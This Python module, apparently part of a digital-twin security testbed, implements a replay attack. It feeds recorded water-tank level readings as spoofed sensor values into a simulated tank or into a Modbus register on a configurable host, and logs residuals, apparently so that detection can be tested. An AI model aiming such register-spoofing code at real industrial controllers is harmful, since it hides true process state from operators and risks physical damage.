"""
Attack Scenario 3: Replay Attack.
Records legitimate process messages / sensor telemetry from a previous time window
and replays them out of context during a different operational phase.
"""

import time
from typing import List, Dict, Any, Optional
from .base import BaseAttack
from twinguard.process.tank import WaterTank
from twinguard.modbus.client import TwinGuardModbusClient
from twinguard.modbus.registers import REG_TANK_LEVEL_SENSOR, RegisterMap


class ReplayAttack(BaseAttack):
    """
    Captures normal operational telemetry and replays it out of context.
    """

    def __init__(
        self,
        tank: Optional[WaterTank] = None,
        recorded_sequence: Optional[List[float]] = None,
        target_host: str = "127.0.0.1",
        target_port: int = 5020,
        duration_sec: float = 12.0,
    ) -> None:
        super().__init__(
            name="replay",
            description="Replays previously recorded legitimate sensor signals out of operational context.",
            target_host=target_host,
            target_port=target_port,
            duration_sec=duration_sec,
        )
        self.tank = tank
        # Default representative recorded filling sequence (25% to 45%)
        self.recorded_sequence = recorded_sequence or [
            25.0, 26.2, 27.5, 29.0, 30.5, 32.0, 34.0, 36.2, 38.5, 41.0, 43.2, 45.0
        ]
        self.replay_log: List[Dict[str, Any]] = []

    def execute(self) -> None:
        end_time = time.time() + self.duration_sec
        seq_idx = 0
        n_samples = len(self.recorded_sequence)

        try:
            while not self._stop_event.is_set() and time.time() < end_time:
                replayed_val = self.recorded_sequence[seq_idx % n_samples]
                seq_idx += 1

                now = time.time()
                current_true = self.tank.current_level if self.tank else 0.0

                if self.tank is not None:
                    self.tank.level_sensor.set_spoof(replayed_val)
                else:
                    client = TwinGuardModbusClient(host=self.target_host, port=self.target_port)
                    if client.connect():
                        raw_val = RegisterMap.to_raw(REG_TANK_LEVEL_SENSOR, replayed_val)
                        client.write_register_raw(address=REG_TANK_LEVEL_SENSOR, value=raw_val)
                        client.close()

                self.events_injected += 1
                entry = {
                    "replay_index": seq_idx,
                    "replayed_value": replayed_val,
                    "true_level": current_true,
                    "residual": abs(current_true - replayed_val),
                    "timestamp": now,
                }
                self.replay_log.append(entry)
                time.sleep(0.5)
        finally:
            if self.tank is not None:
                self.tank.level_sensor.clear_spoof()
            self.metrics["total_replayed"] = self.events_injected
            self.metrics["replayed_samples"] = len(self.replay_log)
